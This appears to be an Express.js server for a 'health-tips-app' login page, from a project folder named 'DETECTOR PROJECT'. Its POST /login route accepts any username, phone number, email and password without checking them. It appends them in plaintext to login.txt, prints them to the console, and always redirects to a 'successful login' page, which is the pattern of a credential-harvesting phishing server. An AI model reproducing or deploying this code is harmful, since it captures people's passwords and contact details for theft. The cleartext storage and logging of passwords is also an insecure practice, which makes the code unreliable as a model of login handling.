// filepath: c:\Users\user\OneDrive\Desktop\DETECTOR PROJECT\server.js
const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const upload = multer();
const fs = require("fs");
const { log } = require("console");
const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/health-tips-app/src/index.html"); // Serve the HTML file
});

app.get("/login", (req, res) => {
  res.sendFile(__dirname + "/health-tips-app/src/login.html"); // Serve the login HTML file
});

app.get("/successful-login", (req, res) => {
  res.sendFile(__dirname + "/health-tips-app/src/successful-login.html"); // Serve the successful login HTML file
});

app.post("/login", upload.none(), (req, res) => {
  const { username, phone, email, password } = req.body;
  const entry = `Username: ${username}, Phone: ${phone}, Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync("login.txt", entry); // Make sure this is 'login.txt'
  res.redirect("/successful-login"); // Redirect to the successful login page
  log(`Login information saved: ${entry}`);
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
